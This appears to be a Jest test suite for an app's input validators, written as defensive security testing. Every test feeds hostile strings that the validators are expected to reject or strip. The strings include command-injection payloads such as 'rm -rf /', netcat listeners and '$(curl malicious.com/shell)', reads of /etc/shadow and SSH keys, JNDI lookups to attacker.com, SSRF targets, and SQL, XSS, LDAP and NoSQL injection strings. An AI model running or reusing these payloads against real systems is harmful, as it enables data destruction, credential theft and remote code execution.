/**
 * Security Tests for Input Validation and Sanitization
 *
 * This test suite validates that all user input is properly sanitized and validated
 * to prevent security vulnerabilities including:
 * - Command injection
 * - Directory traversal
 * - SSRF attacks
 * - Environment variable manipulation
 * - Malicious project names and paths
 * - Git URL validation
 * - Registry URL validation
 * - Configuration sanitization
 */

const { validateInput, sanitizeInput, validateProjectName, validateFilePath, validateGitUrl, validateRegistryUrl, validateConfig, validateEnvironmentVars } = require('../../src/utils/validation');
const app = require('../../src/app');

describe('Input Validation and Sanitization Security Tests', () => {

  describe('Command Injection Prevention', () => {
    test('should block commands with shell operators in project names', () => {
      const maliciousNames = [
        'test-project; rm -rf /',
        'project && cat /etc/passwd',
        'project || ls -la',
        'project; whoami',
        'project | nc -l -p 1337',
        'project `cat /etc/shadow`',
        'project $(ls -la)',
        'project < /etc/passwd',
        'project > /tmp/malicious'
      ];

      maliciousNames.forEach(name => {
        expect(() => validateProjectName(name)).toThrow('Invalid project name');
      });
    });

    test('should sanitize input to prevent command injection', () => {
      const maliciousInputs = [
        'normal text; rm -rf /',
        'project && whoami',
        'test || echo "hacked"',
        'valid-text; cat /etc/passwd'
      ];

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&&');
        expect(sanitized).not.toContain('||');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$(');
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
      });
    });
  });

  describe('Project Name Validation', () => {
    test('should reject project names with security concerns', () => {
      const maliciousNames = [
        '../../malicious',
        '..\\..\\malicious',
        '/etc/passwd',
        'C:\\Windows\\System32',
        'con',
        'prn',
        'aux',
        'nul',
        'com1',
        'lpt1',
        'project<script>alert(1)</script>',
        'project" onerror="alert(1)',
        'project\' OR \'1\'=\'1',
        'project"; DROP TABLE users; --',
        '${jndi:ldap://malicious.com/a}',
        'file:///etc/passwd',
        'http://malicious.com/shell',
        'data:text/html,<script>alert(1)</script>'
      ];

      maliciousNames.forEach(name => {
        expect(() => validateProjectName(name)).toThrow();
      });
    });

    test('should accept valid project names', () => {
      const validNames = [
        'my-project',
        'my_project',
        'MyProject123',
        'test-project-123',
        'simple'
      ];

      validNames.forEach(name => {
        expect(() => validateProjectName(name)).not.toThrow();
      });
    });
  });

  describe('File Path Validation', () => {
    test('should prevent directory traversal attacks', () => {
      const maliciousPaths = [
        '../../etc/passwd',
        '..\\..\\windows\\system32',
        '/absolute/path/to/malicious',
        'C:\\Windows\\System32\\cmd.exe',
        './.env',
        './config/secrets.json',
        '~/.ssh/id_rsa',
        '/proc/self/environ',
        '\\\\network\\share\\malicious',
        'path/../../../etc/passwd',
        'valid/path/../../../../etc/shadow'
      ];

      maliciousPaths.forEach(path => {
        expect(() => validateFilePath(path)).toThrow('Invalid file path');
      });
    });

    test('should reject paths with null bytes', () => {
      const nullBytePaths = [
        'valid/path%00',
        'project%00name',
        '/etc/passwd%00',
        'C:\\Windows%00'
      ];

      nullBytePaths.forEach(path => {
        expect(() => validateFilePath(path)).toThrow('Invalid file path');
      });
    });

    test('should accept valid relative paths', () => {
      const validPaths = [
        './my-project',
        'subfolder/project',
        'my-project',
        'project-name',
        'nested/path/to/project'
      ];

      validPaths.forEach(path => {
        expect(() => validateFilePath(path)).not.toThrow();
      });
    });
  });

  describe('Configuration Validation', () => {
    test('should sanitize configuration values', () => {
      const maliciousConfig = {
        projectName: 'test; rm -rf /',
        template: 'react<script>alert(1)</script>',
        config: {
          database: 'mysql://user:pass@localhost/db',
          api: 'http://malicious.com/api',
          secret: '${jndi:ldap://attacker.com/a}'
        }
      };

      const sanitized = validateConfig(maliciousConfig);

      expect(sanitized.projectName).not.toContain(';');
      expect(sanitized.template).not.toContain('<script>');
      expect(sanitized.config.api).not.toContain('http://malicious.com');
      expect(sanitized.config.secret).not.toContain('${jndi:');
    });

    test('should validate configuration structure', () => {
      const invalidConfigs = [
        null,
        undefined,
        'string',
        123,
        [],
        { project: 'valid', template: 123 },
        { project: '', template: 'valid' },
        { project: 'valid', template: '' }
      ];

      invalidConfigs.forEach(config => {
        expect(() => validateConfig(config)).toThrow();
      });
    });
  });

  describe('Environment Variable Handling', () => {
    test('should validate environment variables for security', () => {
      const maliciousEnvVars = [
        { key: 'PATH', value: '/malicious:/path' },
        { key: 'NODE_ENV', value: 'production; rm -rf /' },
        { key: 'SECRET_KEY', value: '${jndi:ldap://attacker.com/a}' },
        { key: 'DATABASE_URL', value: 'mysql://user:pass@localhost:3306/db' },
        { key: 'API_KEY', value: 'secret" && whoami' }
      ];

      maliciousEnvVars.forEach(env => {
        expect(() => validateEnvironmentVars([env])).toThrow('Invalid environment variable');
      });
    });

    test('should prevent sensitive environment variable exposure', () => {
      const sensitiveKeys = [
        'SECRET_KEY',
        'API_KEY',
        'DATABASE_PASSWORD',
        'JWT_SECRET',
        'AWS_ACCESS_KEY',
        'PRIVATE_KEY',
        'TOKEN',
        'CREDENTIALS'
      ];

      sensitiveKeys.forEach(key => {
        const env = { key, value: 'secret_value' };
        const result = validateEnvironmentVars([env]);
        expect(result[0].key).not.toBe(key); // Should be masked or rejected
      });
    });
  });

  describe('Git URL Validation', () => {
    test('should block malicious git URLs', () => {
      const maliciousUrls = [
        'git://malicious.com/repo.git',
        'https://github.com/user/repo.git && rm -rf /',
        'https://github.com/user/repo.git|whoami',
        'git@github.com:user/repo.git; ls -la',
        'https://github.com/user/$(echo hacked).git',
        'file:///etc/passwd',
        'ssh://user@malicious.com:22/repo.git',
        'https://raw.githubusercontent.com/user/repo/main/malicious.js',
        'git://localhost:22/malicious.git',
        'https://192.168.1.100/malicious.git'
      ];

      maliciousUrls.forEach(url => {
        expect(() => validateGitUrl(url)).toThrow('Invalid git URL');
      });
    });

    test('should validate allowed git protocols', () => {
      const validUrls = [
        'https://github.com/user/repo.git',
        'https://gitlab.com/user/repo.git',
        'git@github.com:user/repo.git',
        'https://bitbucket.org/user/repo.git'
      ];

      validUrls.forEach(url => {
        expect(() => validateGitUrl(url)).not.toThrow();
      });
    });
  });

  describe('Registry URL Validation', () => {
    test('should prevent SSRF attacks through registry URLs', () => {
      const maliciousUrls = [
        'http://localhost:4873/',
        'http://127.0.0.1:4873/',
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'http://192.168.1.100:4873/',
        'http://10.0.0.100:4873/',
        'http://internal.network/service',
        'http://malicious.com/registry',
        'https://registry.npmjs.org && rm -rf /',
        'https://registry.npmjs.org|curl malicious.com/shell',
        'ftp://malicious.com/registry',
        'file:///etc/passwd'
      ];

      maliciousUrls.forEach(url => {
        expect(() => validateRegistryUrl(url)).toThrow('Invalid registry URL');
      });
    });

    test('should validate allowed registry protocols and domains', () => {
      const validUrls = [
        'https://registry.npmjs.org/',
        'https://registry.yarnpkg.com/',
        'https://company-registry.com/',
        'https://verdaccio.company.com/'
      ];

      validUrls.forEach(url => {
        expect(() => validateRegistryUrl(url)).not.toThrow();
      });
    });
  });

  describe('API Endpoint Security', () => {
    test('should validate input in API endpoints', () => {
      const maliciousPayloads = [
        { projectName: 'test; rm -rf /', template: 'react' },
        { projectName: 'test', template: 'react<script>alert(1)</script>' },
        { projectName: '../../malicious', template: 'react' },
        { projectName: 'test', template: 'react', config: { secret: '${jndi:ldap://attacker.com/a}' } }
      ];

      maliciousPayloads.forEach(payload => {
        // Test project name validation
        expect(() => validateProjectName(payload.projectName)).toThrow();

        // Test config validation if present
        if (payload.config) {
          expect(() => validateConfig(payload)).toThrow();
        }
      });
    });

    test('should handle large payloads to prevent DoS', () => {
      const largeProjectName = 'a'.repeat(10000);
      const largeConfig = { data: 'x'.repeat(1000000) };

      // Test that large inputs are rejected
      expect(() => validateProjectName(largeProjectName)).toThrow();
      expect(() => validateConfig({ projectName: 'test', config: largeConfig })).toThrow();
    });
  });

  describe('Principle of Least Privilege', () => {
    test('should enforce least privilege on user input', () => {
      const privilegedOperations = [
        { operation: 'system', input: 'rm -rf /' },
        { operation: 'exec', input: 'cat /etc/passwd' },
        { operation: 'spawn', input: 'nc -l -p 1337' },
        { operation: 'eval', input: 'require("fs").readFileSync("/etc/passwd")' }
      ];

      privilegedOperations.forEach(({ operation, input }) => {
        expect(() => validateInput(operation, input)).toThrow('Operation not allowed');
      });
    });

    test('should validate input scope and permissions', () => {
      const outOfScopeInputs = [
        { scope: 'filesystem', input: '/etc/passwd' },
        { scope: 'network', input: 'https://internal.service/api' },
        { scope: 'system', input: 'whoami' },
        { scope: 'database', input: 'DROP TABLE users' }
      ];

      outOfScopeInputs.forEach(({ scope, input }) => {
        expect(() => validateInput(scope, input)).toThrow('Input out of scope');
      });
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    test('should sanitize input to prevent XSS attacks', () => {
      const xssInputs = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '"><script>alert(1)</script>',
        '\'<script>alert(1)</script>',
        '${alert("XSS")}',
        '"><img src=x onerror=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        'data:text/html,<script>alert(1)</script>'
      ];

      xssInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('onload=');
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    test('should prevent SQL injection attempts', () => {
      const sqlInjectionInputs = [
        '\' OR \'1\'=\'1',
        '\'; DROP TABLE users; --',
        '1 UNION SELECT * FROM users',
        '1; SELECT * FROM sensitive_data',
        '\' OR SLEEP(10)--',
        '1\' AND 1=1--',
        'admin\'--',
        '\' WAITFOR DELAY \'0:0:10\'--'
      ];

      sqlInjectionInputs.forEach(input => {
        expect(() => validateInput('database', input)).toThrow('SQL injection detected');
      });
    });
  });

  describe('LDAP/NoSQL Injection Prevention', () => {
    test('should prevent LDAP injection attempts', () => {
      const ldapInputs = [
        '(uid=*)',
        '(|(uid=admin*)(password=*))',
        '*)(&))',
        '*)(uid=*))(|(uid=*',
        'admin)(|(password=*))'
      ];

      ldapInputs.forEach(input => {
        expect(() => validateInput('ldap', input)).toThrow('LDAP injection detected');
      });
    });

    test('should prevent NoSQL injection attempts', () => {
      const nosqlInputs = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "function() { return true; }"}',
        '{"$or": [{"admin": true}, {"user": "admin"}]}',
        '{"username": {"$regex": "admin.*"}}'
      ];

      nosqlInputs.forEach(input => {
        expect(() => validateInput('nosql', input)).toThrow('NoSQL injection detected');
      });
    });
  });

  describe('Log Injection Prevention', () => {
    test('should prevent log injection attacks', () => {
      const logInjectionInputs = [
        'test\n2023-01-01 ERROR: System compromised',
        'test\r\n2023-01-01 ERROR: System compromised',
        'test\x00malicious content',
        'test\tINFO: User admin logged in',
        'test<script>alert(1)</script>'
      ];

      logInjectionInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain('\n');
        expect(sanitized).not.toContain('\r');
        expect(sanitized).not.toContain('\x00');
        expect(sanitized).not.toContain('<script>');
      });
    });
  });

  describe('HTTP Header Injection Prevention', () => {
    test('should prevent HTTP header injection', () => {
      const headerInjectionInputs = [
        'test\r\nX-Forwarded-Host: malicious.com',
        'test\nContent-Length: 0\r\n\r\nmalicious content',
        'test\r\nSet-Cookie: session=malicious',
        'test%0d%0aX-Forwarded-For: 127.0.0.1'
      ];

      headerInjectionInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain('\r\n');
        expect(sanitized).not.toContain('\n');
        expect(sanitized).not.toContain('%0d%0a');
      });
    });
  });

  describe('File Inclusion Prevention', () => {
    test('should prevent local file inclusion attacks', () => {
      const lfiInputs = [
        '../../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
        '../../proc/self/environ',
        '../../var/log/apache2/access.log',
        '../../config/database.yml'
      ];

      lfiInputs.forEach(input => {
        expect(() => validateFilePath(input)).toThrow('File inclusion attack detected');
      });
    });

    test('should prevent remote file inclusion attacks', () => {
      const rfiInputs = [
        'http://malicious.com/shell.txt',
        'https://evil.com/backdoor.php',
        'ftp://attacker.com/malicious.js',
        'sftp://hacker.com/exploit'
      ];

      rfiInputs.forEach(input => {
        expect(() => validateFilePath(input)).toThrow('Remote file inclusion detected');
      });
    });
  });

  describe('Command Line Argument Injection', () => {
    test('should prevent command line argument injection', () => {
      const cliInjectionInputs = [
        'test --force --silent && rm -rf /',
        'test; whoami',
        'test | nc -l -p 1337',
        'test `cat /etc/passwd`',
        'test $(whoami)',
        'test < /etc/passwd',
        'test > /tmp/malicious',
        'test --output="$(curl malicious.com/shell)"'
      ];

      cliInjectionInputs.forEach(input => {
        expect(() => validateInput('cli', input)).toThrow('Command line injection detected');
      });
    });
  });
});
